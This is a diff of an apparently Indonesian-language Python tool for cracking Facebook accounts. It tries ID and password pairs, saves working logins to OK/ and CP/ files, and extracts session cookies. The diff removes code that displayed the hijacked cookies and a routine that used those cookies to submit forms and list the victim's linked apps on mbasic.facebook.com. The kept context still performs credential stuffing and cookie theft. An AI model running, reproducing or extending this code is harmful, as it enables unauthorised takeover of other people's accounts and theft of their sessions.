@@ -1498,17 +1498,6 @@ def reguler(idf,pwv,awal):
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
-				elif 'ya' in gabriel:
-					cp+=1
-					tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-					tree.add(Panel(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
-					tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
-					prints(tree)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					os.popen('play-audio c.mp3')
-					akun.append(idf+'|'+pw)
-					ceker(idf,pw)
-					break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				if 'no' in taplikasi:
 					ok+=1
@@ -1520,18 +1509,6 @@ def reguler(idf,pwv,awal):
 					prints(tree)
 					os.popen('play-audio o.mp3')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-					break
-				elif 'ya' in taplikasi:
-					ok+=1
-					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-					tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
-					tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
-					tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
-					prints(tree)
-					os.popen('play-audio o.mp3')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-					cek_apk(kuki)
 					break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
@@ -1695,79 +1672,6 @@ def memex(idf,pwv,awal):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-
-
-
-
-
-aktif = []
-kadaluwarsa = []
-###----------[ PRINT MUNCUL APK ]---------- ###
-def get_apk(idf,pw,kuki):
-    try:
-        url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": kuki}).text
-        if "Apa yang Anda pikirkan sekarang" in url:
-            pass
-        else:
-            for z in url.find_all("a",href=True):
-                if "Tidak, Terima Kasih" in z.text:
-                    get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": kuki})
-                    parsing = parser(get.text,"html.parser")
-                    action = parsing.find("form",{"method":"post"})["action"]
-                    data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-                    post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": kuki})
-                    break
-    except:pass
-    
-    aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
-    apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",kuki)
-    if len(aktif)==0:
-        aktip.add(f"{P2}tidak ada aplikasi yang terkait")
-    else:
-        for apk in aktif:
-            aktip.add(f"{H2}{apk}{P2}")
-            kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
-            apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",kuki)
-            if len(kadaluwarsa)==0:
-                kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
-            else:
-                for apk in kadaluwarsa:
-                    kadalu.add(f"{M2}{apk}{P2}")
-                    
-        tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-        tree.add(aktip)
-        tree.add(kadalu)
-        tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
-        prints(tree)
-###----------[ GET APK AKTIF ]---------- ###
-def apkaktif(url,cookie):
-    try:
-        data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-        for apk in data.find_all("h3"):
-            if "Ditambahkan" in apk.text:
-                aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
-            else:continue
-            next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-            apkaktif(next,cookie)
-    except:pass
-		
-###----------[ GET APK KADALUWARSA ]---------- ###
-def apkkadaluwarsa(url,cookie):
-    try:
-        data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-        for apk in data.find_all("h3"):
-            if "Kedaluwarsa" in apk.text:
-                kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
-            else:continue
-            next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-            apkkadaluwarsa(next,cookie)
-    except:pass
-	
-
 
 #-----------------------[ CEK APLIKASI ]--------------------#
 def cek_apk(kuki):
